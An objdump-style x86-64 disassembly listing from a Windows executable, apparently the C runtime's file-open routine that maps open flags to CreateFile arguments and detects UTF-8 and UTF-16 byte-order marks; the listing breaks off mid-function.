   14000ac07:	b8 00 80 00 00       	mov    $0x8000,%eax
   14000ac0c:	85 f0                	test   %esi,%eax
   14000ac0e:	75 10                	jne    0x14000ac20
   14000ac10:	f7 c6 00 40 07 00    	test   $0x74000,%esi
   14000ac16:	75 05                	jne    0x14000ac1d
   14000ac18:	39 45 df             	cmp    %eax,-0x21(%rbp)
   14000ac1b:	74 03                	je     0x14000ac20
   14000ac1d:	45 0a e7             	or     %r15b,%r12b
   14000ac20:	8b ce                	mov    %esi,%ecx
   14000ac22:	41 b9 03 00 00 00    	mov    $0x3,%r9d
   14000ac28:	b8 00 00 00 c0       	mov    $0xc0000000,%eax
   14000ac2d:	ba 00 00 00 80       	mov    $0x80000000,%edx
   14000ac32:	41 23 c9             	and    %r9d,%ecx
   14000ac35:	74 5b                	je     0x14000ac92
   14000ac37:	ff c9                	dec    %ecx
   14000ac39:	74 41                	je     0x14000ac7c
   14000ac3b:	ff c9                	dec    %ecx
   14000ac3d:	74 38                	je     0x14000ac77
   14000ac3f:	e8 c4 98 ff ff       	call   0x140004508
   14000ac44:	89 38                	mov    %edi,(%rax)
   14000ac46:	83 0b ff             	orl    $0xffffffff,(%rbx)
   14000ac49:	e8 2a 99 ff ff       	call   0x140004578
   14000ac4e:	bb 16 00 00 00       	mov    $0x16,%ebx
   14000ac53:	89 18                	mov    %ebx,(%rax)
   14000ac55:	e8 ce 94 ff ff       	call   0x140004128
   14000ac5a:	8b c3                	mov    %ebx,%eax
   14000ac5c:	48 8b 9c 24 d8 00 00 	mov    0xd8(%rsp),%rbx
   14000ac63:	00 
   14000ac64:	48 81 c4 90 00 00 00 	add    $0x90,%rsp
   14000ac6b:	41 5f                	pop    %r15
   14000ac6d:	41 5e                	pop    %r14
   14000ac6f:	41 5d                	pop    %r13
   14000ac71:	41 5c                	pop    %r12
   14000ac73:	5f                   	pop    %rdi
   14000ac74:	5e                   	pop    %rsi
   14000ac75:	5d                   	pop    %rbp
   14000ac76:	c3                   	ret
   14000ac77:	44 8b e8             	mov    %eax,%r13d
   14000ac7a:	eb 19                	jmp    0x14000ac95
   14000ac7c:	40 f6 c6 08          	test   $0x8,%sil
   14000ac80:	74 08                	je     0x14000ac8a
   14000ac82:	f7 c6 00 00 07 00    	test   $0x70000,%esi
   14000ac88:	75 ed                	jne    0x14000ac77
   14000ac8a:	41 bd 00 00 00 40    	mov    $0x40000000,%r13d
   14000ac90:	eb 03                	jmp    0x14000ac95
   14000ac92:	44 8b ea             	mov    %edx,%r13d
   14000ac95:	8b 4d 6f             	mov    0x6f(%rbp),%ecx
   14000ac98:	44 89 6d bf          	mov    %r13d,-0x41(%rbp)
   14000ac9c:	41 bf 02 00 00 00    	mov    $0x2,%r15d
   14000aca2:	83 e9 10             	sub    $0x10,%ecx
   14000aca5:	74 2d                	je     0x14000acd4
   14000aca7:	83 e9 10             	sub    $0x10,%ecx
   14000acaa:	74 23                	je     0x14000accf
   14000acac:	83 e9 10             	sub    $0x10,%ecx
   14000acaf:	74 19                	je     0x14000acca
   14000acb1:	83 e9 10             	sub    $0x10,%ecx
   14000acb4:	74 0f                	je     0x14000acc5
   14000acb6:	83 f9 40             	cmp    $0x40,%ecx
   14000acb9:	75 84                	jne    0x14000ac3f
   14000acbb:	44 3b ea             	cmp    %edx,%r13d
   14000acbe:	8b cf                	mov    %edi,%ecx
   14000acc0:	0f 94 c1             	sete   %cl
   14000acc3:	eb 11                	jmp    0x14000acd6
   14000acc5:	41 8b c9             	mov    %r9d,%ecx
   14000acc8:	eb 0c                	jmp    0x14000acd6
   14000acca:	41 8b cf             	mov    %r15d,%ecx
   14000accd:	eb 07                	jmp    0x14000acd6
   14000accf:	41 8b ce             	mov    %r14d,%ecx
   14000acd2:	eb 02                	jmp    0x14000acd6
   14000acd4:	8b cf                	mov    %edi,%ecx
   14000acd6:	8b c6                	mov    %esi,%eax
   14000acd8:	ba 00 07 00 00       	mov    $0x700,%edx
   14000acdd:	89 4d c3             	mov    %ecx,-0x3d(%rbp)
   14000ace0:	41 b8 00 01 00 00    	mov    $0x100,%r8d
   14000ace6:	23 c2                	and    %edx,%eax
   14000ace8:	74 46                	je     0x14000ad30
   14000acea:	41 3b c0             	cmp    %r8d,%eax
   14000aced:	74 39                	je     0x14000ad28
   14000acef:	3d 00 02 00 00       	cmp    $0x200,%eax
   14000acf4:	74 2a                	je     0x14000ad20
   14000acf6:	3d 00 03 00 00       	cmp    $0x300,%eax
   14000acfb:	74 1e                	je     0x14000ad1b
   14000acfd:	3d 00 04 00 00       	cmp    $0x400,%eax
   14000ad02:	74 2c                	je     0x14000ad30
   14000ad04:	3d 00 05 00 00       	cmp    $0x500,%eax
   14000ad09:	74 28                	je     0x14000ad33
   14000ad0b:	3d 00 06 00 00       	cmp    $0x600,%eax
   14000ad10:	74 0e                	je     0x14000ad20
   14000ad12:	3b c2                	cmp    %edx,%eax
   14000ad14:	74 1d                	je     0x14000ad33
   14000ad16:	e9 24 ff ff ff       	jmp    0x14000ac3f
   14000ad1b:	45 8b f7             	mov    %r15d,%r14d
   14000ad1e:	eb 13                	jmp    0x14000ad33
   14000ad20:	41 be 05 00 00 00    	mov    $0x5,%r14d
   14000ad26:	eb 0b                	jmp    0x14000ad33
   14000ad28:	41 be 04 00 00 00    	mov    $0x4,%r14d
   14000ad2e:	eb 03                	jmp    0x14000ad33
   14000ad30:	45 8b f1             	mov    %r9d,%r14d
   14000ad33:	ba 80 00 00 00       	mov    $0x80,%edx
   14000ad38:	8b c7                	mov    %edi,%eax
   14000ad3a:	89 55 cf             	mov    %edx,-0x31(%rbp)
   14000ad3d:	89 45 c7             	mov    %eax,-0x39(%rbp)
   14000ad40:	41 85 f0             	test   %esi,%r8d
   14000ad43:	74 18                	je     0x14000ad5d
   14000ad45:	8a 05 fd 03 01 00    	mov    0x103fd(%rip),%al        # 0x14001b148
   14000ad4b:	f6 d0                	not    %al
   14000ad4d:	22 45 77             	and    0x77(%rbp),%al
   14000ad50:	a8 80                	test   $0x80,%al
   14000ad52:	8d 42 81             	lea    -0x7f(%rdx),%eax
   14000ad55:	0f 44 d0             	cmove  %eax,%edx
   14000ad58:	8b c7                	mov    %edi,%eax
   14000ad5a:	89 55 cf             	mov    %edx,-0x31(%rbp)
   14000ad5d:	40 f6 c6 40          	test   $0x40,%sil
   14000ad61:	74 17                	je     0x14000ad7a
   14000ad63:	41 0f ba ed 10       	bts    $0x10,%r13d
   14000ad68:	b8 00 00 00 04       	mov    $0x4000000,%eax
   14000ad6d:	83 c9 04             	or     $0x4,%ecx
   14000ad70:	89 4d c3             	mov    %ecx,-0x3d(%rbp)
   14000ad73:	89 45 c7             	mov    %eax,-0x39(%rbp)
   14000ad76:	44 89 6d bf          	mov    %r13d,-0x41(%rbp)
   14000ad7a:	0f ba e6 0c          	bt     $0xc,%esi
   14000ad7e:	73 06                	jae    0x14000ad86
   14000ad80:	41 0b d0             	or     %r8d,%edx
   14000ad83:	89 55 cf             	mov    %edx,-0x31(%rbp)
   14000ad86:	0f ba e6 0d          	bt     $0xd,%esi
   14000ad8a:	73 07                	jae    0x14000ad93
   14000ad8c:	0f ba e8 19          	bts    $0x19,%eax
   14000ad90:	89 45 c7             	mov    %eax,-0x39(%rbp)
   14000ad93:	40 f6 c6 20          	test   $0x20,%sil
   14000ad97:	74 06                	je     0x14000ad9f
   14000ad99:	0f ba e8 1b          	bts    $0x1b,%eax
   14000ad9d:	eb 0a                	jmp    0x14000ada9
   14000ad9f:	40 f6 c6 10          	test   $0x10,%sil
   14000ada3:	74 07                	je     0x14000adac
   14000ada5:	0f ba e8 1c          	bts    $0x1c,%eax
   14000ada9:	89 45 c7             	mov    %eax,-0x39(%rbp)
   14000adac:	e8 33 d5 ff ff       	call   0x1400082e4
   14000adb1:	89 03                	mov    %eax,(%rbx)
   14000adb3:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000adb6:	75 21                	jne    0x14000add9
   14000adb8:	e8 4b 97 ff ff       	call   0x140004508
   14000adbd:	89 38                	mov    %edi,(%rax)
   14000adbf:	83 0b ff             	orl    $0xffffffff,(%rbx)
   14000adc2:	e8 b1 97 ff ff       	call   0x140004578
   14000adc7:	c7 00 18 00 00 00    	movl   $0x18,(%rax)
   14000adcd:	e8 a6 97 ff ff       	call   0x140004578
   14000add2:	8b 00                	mov    (%rax),%eax
   14000add4:	e9 83 fe ff ff       	jmp    0x14000ac5c
   14000add9:	48 8b 45 4f          	mov    0x4f(%rbp),%rax
   14000addd:	44 8b 45 c3          	mov    -0x3d(%rbp),%r8d
   14000ade1:	48 8b 4d 5f          	mov    0x5f(%rbp),%rcx
   14000ade5:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   14000adeb:	8b 45 c7             	mov    -0x39(%rbp),%eax
   14000adee:	4c 8d 4d ef          	lea    -0x11(%rbp),%r9
   14000adf2:	89 44 24 30          	mov    %eax,0x30(%rsp)
   14000adf6:	8b 45 cf             	mov    -0x31(%rbp),%eax
   14000adf9:	41 8b d5             	mov    %r13d,%edx
   14000adfc:	89 44 24 28          	mov    %eax,0x28(%rsp)
   14000ae00:	44 89 74 24 20       	mov    %r14d,0x20(%rsp)
   14000ae05:	e8 a2 fc ff ff       	call   0x14000aaac
   14000ae0a:	48 89 45 e7          	mov    %rax,-0x19(%rbp)
   14000ae0e:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000ae12:	0f 85 8d 00 00 00    	jne    0x14000aea5
   14000ae18:	b9 00 00 00 c0       	mov    $0xc0000000,%ecx
   14000ae1d:	41 8b c5             	mov    %r13d,%eax
   14000ae20:	23 c1                	and    %ecx,%eax
   14000ae22:	3b c1                	cmp    %ecx,%eax
   14000ae24:	75 44                	jne    0x14000ae6a
   14000ae26:	b8 01 00 00 00       	mov    $0x1,%eax
   14000ae2b:	40 84 f0             	test   %sil,%al
   14000ae2e:	74 3a                	je     0x14000ae6a
   14000ae30:	8b 45 c7             	mov    -0x39(%rbp),%eax
   14000ae33:	44 8b 45 c3          	mov    -0x3d(%rbp),%r8d
   14000ae37:	48 8b 4d 5f          	mov    0x5f(%rbp),%rcx
   14000ae3b:	89 44 24 30          	mov    %eax,0x30(%rsp)
   14000ae3f:	8b 45 cf             	mov    -0x31(%rbp),%eax
   14000ae42:	41 0f ba f5 1f       	btr    $0x1f,%r13d
   14000ae47:	89 44 24 28          	mov    %eax,0x28(%rsp)
   14000ae4b:	4c 8d 4d ef          	lea    -0x11(%rbp),%r9
   14000ae4f:	41 8b d5             	mov    %r13d,%edx
   14000ae52:	44 89 74 24 20       	mov    %r14d,0x20(%rsp)
   14000ae57:	44 89 6d bf          	mov    %r13d,-0x41(%rbp)
   14000ae5b:	e8 4c fc ff ff       	call   0x14000aaac
   14000ae60:	48 89 45 e7          	mov    %rax,-0x19(%rbp)
   14000ae64:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000ae68:	75 3b                	jne    0x14000aea5
   14000ae6a:	48 63 0b             	movslq (%rbx),%rcx
   14000ae6d:	4c 8d 2d 9c 00 01 00 	lea    0x1009c(%rip),%r13        # 0x14001af10
   14000ae74:	48 8b c1             	mov    %rcx,%rax
   14000ae77:	83 e1 1f             	and    $0x1f,%ecx
   14000ae7a:	48 c1 f8 05          	sar    $0x5,%rax
   14000ae7e:	48 6b c9 58          	imul   $0x58,%rcx,%rcx
   14000ae82:	49 8b 44 c5 00       	mov    0x0(%r13,%rax,8),%rax
   14000ae87:	80 64 08 08 fe       	andb   $0xfe,0x8(%rax,%rcx,1)
   14000ae8c:	ff 15 fe 61 00 00    	call   *0x61fe(%rip)        # 0x140011090
   14000ae92:	8b c8                	mov    %eax,%ecx
   14000ae94:	e8 8f 96 ff ff       	call   0x140004528
   14000ae99:	e8 da 96 ff ff       	call   0x140004578
   14000ae9e:	8b 38                	mov    (%rax),%edi
   14000aea0:	e9 92 04 00 00       	jmp    0x14000b337
   14000aea5:	48 8b c8             	mov    %rax,%rcx
   14000aea8:	ff 15 ba 62 00 00    	call   *0x62ba(%rip)        # 0x140011168
   14000aeae:	85 c0                	test   %eax,%eax
   14000aeb0:	75 4c                	jne    0x14000aefe
   14000aeb2:	48 63 0b             	movslq (%rbx),%rcx
   14000aeb5:	4c 8d 2d 54 00 01 00 	lea    0x10054(%rip),%r13        # 0x14001af10
   14000aebc:	48 8b c1             	mov    %rcx,%rax
   14000aebf:	83 e1 1f             	and    $0x1f,%ecx
   14000aec2:	48 c1 f8 05          	sar    $0x5,%rax
   14000aec6:	48 6b c9 58          	imul   $0x58,%rcx,%rcx
   14000aeca:	49 8b 44 c5 00       	mov    0x0(%r13,%rax,8),%rax
   14000aecf:	80 64 08 08 fe       	andb   $0xfe,0x8(%rax,%rcx,1)
   14000aed4:	ff 15 b6 61 00 00    	call   *0x61b6(%rip)        # 0x140011090
   14000aeda:	8b c8                	mov    %eax,%ecx
   14000aedc:	8b d8                	mov    %eax,%ebx
   14000aede:	e8 45 96 ff ff       	call   0x140004528
   14000aee3:	48 8b 4d e7          	mov    -0x19(%rbp),%rcx
   14000aee7:	ff 15 13 61 00 00    	call   *0x6113(%rip)        # 0x140011000
   14000aeed:	85 db                	test   %ebx,%ebx
   14000aeef:	75 a8                	jne    0x14000ae99
   14000aef1:	e8 82 96 ff ff       	call   0x140004578
   14000aef6:	c7 00 0d 00 00 00    	movl   $0xd,(%rax)
   14000aefc:	eb 9b                	jmp    0x14000ae99
   14000aefe:	41 3b c7             	cmp    %r15d,%eax
   14000af01:	75 06                	jne    0x14000af09
   14000af03:	41 80 cc 40          	or     $0x40,%r12b
   14000af07:	eb 09                	jmp    0x14000af12
   14000af09:	83 f8 03             	cmp    $0x3,%eax
   14000af0c:	75 04                	jne    0x14000af12
   14000af0e:	41 80 cc 08          	or     $0x8,%r12b
   14000af12:	48 8b 55 e7          	mov    -0x19(%rbp),%rdx
   14000af16:	8b 0b                	mov    (%rbx),%ecx
   14000af18:	e8 df d6 ff ff       	call   0x1400085fc
   14000af1d:	48 63 0b             	movslq (%rbx),%rcx
   14000af20:	4c 8d 2d e9 ff 00 00 	lea    0xffe9(%rip),%r13        # 0x14001af10
   14000af27:	48 8b c1             	mov    %rcx,%rax
   14000af2a:	83 e1 1f             	and    $0x1f,%ecx
   14000af2d:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000af33:	48 c1 f8 05          	sar    $0x5,%rax
   14000af37:	45 0a e0             	or     %r8b,%r12b
   14000af3a:	49 8b 44 c5 00       	mov    0x0(%r13,%rax,8),%rax
   14000af3f:	48 6b c9 58          	imul   $0x58,%rcx,%rcx
   14000af43:	44 88 64 08 08       	mov    %r12b,0x8(%rax,%rcx,1)
   14000af48:	48 63 0b             	movslq (%rbx),%rcx
   14000af4b:	48 8b c1             	mov    %rcx,%rax
   14000af4e:	83 e1 1f             	and    $0x1f,%ecx
   14000af51:	48 c1 f8 05          	sar    $0x5,%rax
   14000af55:	48 6b c9 58          	imul   $0x58,%rcx,%rcx
   14000af59:	49 8b 44 c5 00       	mov    0x0(%r13,%rax,8),%rax
   14000af5e:	80 64 08 38 80       	andb   $0x80,0x38(%rax,%rcx,1)
   14000af63:	41 8a c4             	mov    %r12b,%al
   14000af66:	24 48                	and    $0x48,%al
   14000af68:	88 45 cb             	mov    %al,-0x35(%rbp)
   14000af6b:	0f 85 87 00 00 00    	jne    0x14000aff8
   14000af71:	45 84 e4             	test   %r12b,%r12b
   14000af74:	0f 89 99 02 00 00    	jns    0x14000b213
   14000af7a:	41 84 f7             	test   %sil,%r15b
   14000af7d:	74 79                	je     0x14000aff8
   14000af7f:	8b 0b                	mov    (%rbx),%ecx
   14000af81:	45 8b c7             	mov    %r15d,%r8d
   14000af84:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   14000af88:	e8 b3 ed ff ff       	call   0x140009d40
   14000af8d:	48 89 45 d7          	mov    %rax,-0x29(%rbp)
   14000af91:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000af95:	75 19                	jne    0x14000afb0
   14000af97:	e8 6c 95 ff ff       	call   0x140004508
   14000af9c:	81 38 83 00 00 00    	cmpl   $0x83,(%rax)
   14000afa2:	74 4e                	je     0x14000aff2
   14000afa4:	8b 0b                	mov    (%rbx),%ecx
   14000afa6:	e8 a1 94 ff ff       	call   0x14000444c
   14000afab:	e9 e9 fe ff ff       	jmp    0x14000ae99
   14000afb0:	8b 0b                	mov    (%rbx),%ecx
   14000afb2:	48 8d 55 d3          	lea    -0x2d(%rbp),%rdx
   14000afb6:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000afbc:	66 89 7d d3          	mov    %di,-0x2d(%rbp)
   14000afc0:	e8 c7 14 00 00       	call   0x14000c48c
   14000afc5:	85 c0                	test   %eax,%eax
   14000afc7:	75 17                	jne    0x14000afe0
   14000afc9:	66 83 7d d3 1a       	cmpw   $0x1a,-0x2d(%rbp)
   14000afce:	75 10                	jne    0x14000afe0
   14000afd0:	48 8b 55 d7          	mov    -0x29(%rbp),%rdx
   14000afd4:	8b 0b                	mov    (%rbx),%ecx
   14000afd6:	e8 19 13 00 00       	call   0x14000c2f4
   14000afdb:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000afde:	74 c4                	je     0x14000afa4
   14000afe0:	8b 0b                	mov    (%rbx),%ecx
   14000afe2:	45 33 c0             	xor    %r8d,%r8d
   14000afe5:	33 d2                	xor    %edx,%edx
   14000afe7:	e8 54 ed ff ff       	call   0x140009d40
   14000afec:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000aff0:	74 b2                	je     0x14000afa4
   14000aff2:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000aff8:	45 84 e4             	test   %r12b,%r12b
   14000affb:	0f 89 12 02 00 00    	jns    0x14000b213
   14000b001:	41 b9 00 40 07 00    	mov    $0x74000,%r9d
   14000b007:	ba 00 40 00 00       	mov    $0x4000,%edx
   14000b00c:	41 85 f1             	test   %esi,%r9d
   14000b00f:	75 0e                	jne    0x14000b01f
   14000b011:	8b 45 df             	mov    -0x21(%rbp),%eax
   14000b014:	41 23 c1             	and    %r9d,%eax
   14000b017:	75 04                	jne    0x14000b01d
   14000b019:	0b f2                	or     %edx,%esi
   14000b01b:	eb 02                	jmp    0x14000b01f
   14000b01d:	0b f0                	or     %eax,%esi
   14000b01f:	8b ce                	mov    %esi,%ecx
   14000b021:	41 23 c9             	and    %r9d,%ecx
   14000b024:	3b ca                	cmp    %edx,%ecx
   14000b026:	74 3c                	je     0x14000b064
   14000b028:	8d 81 00 00 ff ff    	lea    -0x10000(%rcx),%eax
   14000b02e:	ba ff bf ff ff       	mov    $0xffffbfff,%edx
   14000b033:	85 c2                	test   %eax,%edx
   14000b035:	74 1a                	je     0x14000b051
   14000b037:	8d 81 00 00 fe ff    	lea    -0x20000(%rcx),%eax
   14000b03d:	85 c2                	test   %eax,%edx
   14000b03f:	74 1d                	je     0x14000b05e
   14000b041:	8d 81 00 00 fc ff    	lea    -0x40000(%rcx),%eax
   14000b047:	85 c2                	test   %eax,%edx
   14000b049:	75 1d                	jne    0x14000b068
   14000b04b:	44 88 45 67          	mov    %r8b,0x67(%rbp)
   14000b04f:	eb 17                	jmp    0x14000b068
   14000b051:	b9 01 03 00 00       	mov    $0x301,%ecx
   14000b056:	8b c6                	mov    %esi,%eax
   14000b058:	23 c1                	and    %ecx,%eax
   14000b05a:	3b c1                	cmp    %ecx,%eax
   14000b05c:	75 0a                	jne    0x14000b068
   14000b05e:	44 88 7d 67          	mov    %r15b,0x67(%rbp)
   14000b062:	eb 04                	jmp    0x14000b068
   14000b064:	40 88 7d 67          	mov    %dil,0x67(%rbp)
   14000b068:	f7 c6 00 00 07 00    	test   $0x70000,%esi
   14000b06e:	0f 84 9f 01 00 00    	je     0x14000b213
   14000b074:	41 f6 c4 40          	test   $0x40,%r12b
   14000b078:	44 8b 65 bf          	mov    -0x41(%rbp),%r12d
   14000b07c:	89 7d d7             	mov    %edi,-0x29(%rbp)
   14000b07f:	0f 85 92 01 00 00    	jne    0x14000b217
   14000b085:	41 8b c4             	mov    %r12d,%eax
   14000b088:	b9 00 00 00 c0       	mov    $0xc0000000,%ecx
   14000b08d:	23 c1                	and    %ecx,%eax
   14000b08f:	3d 00 00 00 40       	cmp    $0x40000000,%eax
   14000b094:	0f 84 fe 00 00 00    	je     0x14000b198
   14000b09a:	3d 00 00 00 80       	cmp    $0x80000000,%eax
   14000b09f:	74 70                	je     0x14000b111
   14000b0a1:	3b c1                	cmp    %ecx,%eax
   14000b0a3:	0f 85 6e 01 00 00    	jne    0x14000b217
   14000b0a9:	45 85 f6             	test   %r14d,%r14d
   14000b0ac:	0f 84 65 01 00 00    	je     0x14000b217
   14000b0b2:	45 3b f7             	cmp    %r15d,%r14d
   14000b0b5:	76 10                	jbe    0x14000b0c7
   14000b0b7:	41 83 fe 04          	cmp    $0x4,%r14d
   14000b0bb:	76 2d                	jbe    0x14000b0ea
   14000b0bd:	41 83 fe 05          	cmp    $0x5,%r14d
   14000b0c1:	0f 85 50 01 00 00    	jne    0x14000b217
   14000b0c7:	0f be 4d 67          	movsbl 0x67(%rbp),%ecx
   14000b0cb:	44 8b f7             	mov    %edi,%r14d
   14000b0ce:	ff c9                	dec    %ecx
   14000b0d0:	0f 84 06 01 00 00    	je     0x14000b1dc
   14000b0d6:	ff c9                	dec    %ecx
   14000b0d8:	0f 85 39 01 00 00    	jne    0x14000b217
   14000b0de:	c7 45 d7 ff fe 00 00 	movl   $0xfeff,-0x29(%rbp)
   14000b0e5:	e9 ff 00 00 00       	jmp    0x14000b1e9
   14000b0ea:	8b 0b                	mov    (%rbx),%ecx
   14000b0ec:	45 8b c7             	mov    %r15d,%r8d
   14000b0ef:	33 d2                	xor    %edx,%edx
   14000b0f1:	e8 4a ec ff ff       	call   0x140009d40
   14000b0f6:	48 85 c0             	test   %rax,%rax
   14000b0f9:	74 cc                	je     0x14000b0c7
   14000b0fb:	8b 0b                	mov    (%rbx),%ecx
   14000b0fd:	45 33 c0             	xor    %r8d,%r8d
   14000b100:	33 d2                	xor    %edx,%edx
   14000b102:	e8 39 ec ff ff       	call   0x140009d40
   14000b107:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000b10b:	0f 84 93 fe ff ff    	je     0x14000afa4
   14000b111:	8b 0b                	mov    (%rbx),%ecx
   14000b113:	48 8d 55 d7          	lea    -0x29(%rbp),%rdx
   14000b117:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   14000b11d:	e8 6a 13 00 00       	call   0x14000c48c
   14000b122:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000b125:	0f 84 79 fe ff ff    	je     0x14000afa4
   14000b12b:	41 3b c7             	cmp    %r15d,%eax
   14000b12e:	74 1f                	je     0x14000b14f
   14000b130:	83 f8 03             	cmp    $0x3,%eax
   14000b133:	0f 85 8c 00 00 00    	jne    0x14000b1c5
   14000b139:	81 7d d7 ef bb bf 00 	cmpl   $0xbfbbef,-0x29(%rbp)
   14000b140:	75 0d                	jne    0x14000b14f
   14000b142:	44 8d 40 fe          	lea    -0x2(%rax),%r8d
   14000b146:	44 88 45 67          	mov    %r8b,0x67(%rbp)
   14000b14a:	e9 ce 00 00 00       	jmp    0x14000b21d
   14000b14f:	0f b7 45 d7          	movzwl -0x29(%rbp),%eax
   14000b153:	3d fe ff 00 00       	cmp    $0xfffe,%eax
   14000b158:	75 1a                	jne    0x14000b174
   14000b15a:	8b 0b                	mov    (%rbx),%ecx
   14000b15c:	e8 eb 92 ff ff       	call   0x14000444c
   14000b161:	e8 12 94 ff ff       	call   0x140004578
   14000b166:	bb 16 00 00 00       	mov    $0x16,%ebx
   14000b16b:	89 18                	mov    %ebx,(%rax)
   14000b16d:	8b fb                	mov    %ebx,%edi
   14000b16f:	e9 c3 01 00 00       	jmp    0x14000b337
   14000b174:	3d ff fe 00 00       	cmp    $0xfeff,%eax
   14000b179:	75 4a                	jne    0x14000b1c5
   14000b17b:	8b 0b                	mov    (%rbx),%ecx
   14000b17d:	45 33 c0             	xor    %r8d,%r8d
   14000b180:	49 8b d7             	mov    %r15,%rdx
   14000b183:	e8 b8 eb ff ff       	call   0x140009d40
   14000b188:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000b18c:	0f 84 12 fe ff ff    	je     0x14000afa4
   14000b192:	44 88 7d 67          	mov    %r15b,0x67(%rbp)
   14000b196:	eb 7f                	jmp    0x14000b217
   14000b198:	45 85 f6             	test   %r14d,%r14d
   14000b19b:	74 7a                	je     0x14000b217
   14000b19d:	45 3b f7             	cmp    %r15d,%r14d
   14000b1a0:	0f 86 21 ff ff ff    	jbe    0x14000b0c7
   14000b1a6:	41 83 fe 04          	cmp    $0x4,%r14d
   14000b1aa:	0f 87 0d ff ff ff    	ja     0x14000b0bd
   14000b1b0:	8b 0b                	mov    (%rbx),%ecx
   14000b1b2:	45 8b c7             	mov    %r15d,%r8d
   14000b1b5:	33 d2                	xor    %edx,%edx
   14000b1b7:	e8 84 eb ff ff       	call   0x140009d40
   14000b1bc:	48 85 c0             	test   %rax,%rax
   14000b1bf:	0f 84 02 ff ff ff    	je     0x14000b0c7
   14000b1c5:	8b 0b                	mov    (%rbx),%ecx
   14000b1c7:	45 33 c0             	xor    %r8d,%r8d
   14000b1ca:	33 d2                	xor    %edx,%edx
   14000b1cc:	e8 6f eb ff ff       	call   0x140009d40
   14000b1d1:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000b1d5:	75 40                	jne    0x14000b217
   14000b1d7:	e9 c8 fd ff ff       	jmp    0x14000afa4
   14000b1dc:	c7 45 d7 ef bb bf 00 	movl   $0xbfbbef,-0x29(%rbp)
   14000b1e3:	41 bf 03 00 00 00    	mov    $0x3,%r15d
   14000b1e9:	8b 0b                	mov    (%rbx),%ecx
   14000b1eb:	45 8b c7             	mov    %r15d,%r8d
   14000b1ee:	49 63 c6             	movslq %r14d,%rax
   14000b1f1:	48 8d 55 d7          	lea    -0x29(%rbp),%rdx
   14000b1f5:	45 2b c6             	sub    %r14d,%r8d
   14000b1f8:	48 03 d0             	add    %rax,%rdx
   14000b1fb:	e8 e0 ad ff ff       	call   0x140005fe0
   14000b200:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000b203:	0f 84 9b fd ff ff    	je     0x14000afa4
   14000b209:	44 03 f0             	add    %eax,%r14d
   14000b20c:	45 3b fe             	cmp    %r14d,%r15d
   14000b20f:	7f d8                	jg     0x14000b1e9
   14000b211:	eb 04                	jmp    0x14000b217
   14000b213:	44 8b 65 bf          	mov    -0x41(%rbp),%r12d
   14000b217:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000b21d:	48 63 0b             	movslq (%rbx),%rcx
   14000b220:	48 8b c1             	mov    %rcx,%rax
   14000b223:	83 e1 1f             	and    $0x1f,%ecx
   14000b226:	48 c1 f8 05          	sar    $0x5,%rax
   14000b22a:	48 6b d1 58          	imul   $0x58,%rcx,%rdx
   14000b22e:	49 8b 4c c5 00       	mov    0x0(%r13,%rax,8),%rcx
   14000b233:	8a 45 67             	mov    0x67(%rbp),%al
   14000b236:	80 64 11 38 80       	andb   $0x80,0x38(%rcx,%rdx,1)
   14000b23b:	24 7f                	and    $0x7f,%al
   14000b23d:	08 44 11 38          	or     %al,0x38(%rcx,%rdx,1)
   14000b241:	48 63 0b             	movslq (%rbx),%rcx
   14000b244:	48 8b c1             	mov    %rcx,%rax
   14000b247:	83 e1 1f             	and    $0x1f,%ecx
   14000b24a:	48 c1 f8 05          	sar    $0x5,%rax
   14000b24e:	48 6b d1 58          	imul   $0x58,%rcx,%rdx
   14000b252:	49 8b 4c c5 00       	mov    0x0(%r13,%rax,8),%rcx
   14000b257:	8b c6                	mov    %esi,%eax
   14000b259:	80 64 11 38 7f       	andb   $0x7f,0x38(%rcx,%rdx,1)
   14000b25e:	c1 e8 10             	shr    $0x10,%eax
   14000b261:	c0 e0 07             	shl    $0x7,%al
   14000b264:	08 44 11 38          	or     %al,0x38(%rcx,%rdx,1)
   14000b268:	40 38 7d cb          	cmp    %dil,-0x35(%rbp)
   14000b26c:	75 21                	jne    0x14000b28f
   14000b26e:	40 f6 c6 08          	test   $0x8,%sil
   14000b272:	74 1b                	je     0x14000b28f
   14000b274:	48 63 0b             	movslq (%rbx),%rcx
   14000b277:	48 8b c1             	mov    %rcx,%rax
   14000b27a:	83 e1 1f             	and    $0x1f,%ecx
   14000b27d:	48 c1 f8 05          	sar    $0x5,%rax
   14000b281:	48 6b c9 58          	imul   $0x58,%rcx,%rcx
   14000b285:	49 8b 44 c5 00       	mov    0x0(%r13,%rax,8),%rax
   14000b28a:	80 4c 08 08 20       	orb    $0x20,0x8(%rax,%rcx,1)
   14000b28f:	b9 00 00 00 c0       	mov    $0xc0000000,%ecx
   14000b294:	41 8b c4             	mov    %r12d,%eax
   14000b297:	23 c1                	and    %ecx,%eax
   14000b299:	3b c1                	cmp    %ecx,%eax
   14000b29b:	0f 85 96 00 00 00    	jne    0x14000b337
   14000b2a1:	41 84 f0             	test   %sil,%r8b
   14000b2a4:	0f 84 8d 00 00 00    	je     0x14000b337
   14000b2aa:	48 8b 4d e7          	mov    -0x19(%rbp),%rcx
   14000b2ae:	ff 15 4c 5d 00 00    	call   *0x5d4c(%rip)        # 0x140011000
   14000b2b4:	8b 45 c7             	mov    -0x39(%rbp),%eax
   14000b2b7:	44 8b 45 c3          	mov    -0x3d(%rbp),%r8d
   14000b2bb:	48 8b 4d 5f          	mov    0x5f(%rbp),%rcx
   14000b2bf:	89 44 24 30          	mov    %eax,0x30(%rsp)
   14000b2c3:	8b 45 cf             	mov    -0x31(%rbp),%eax
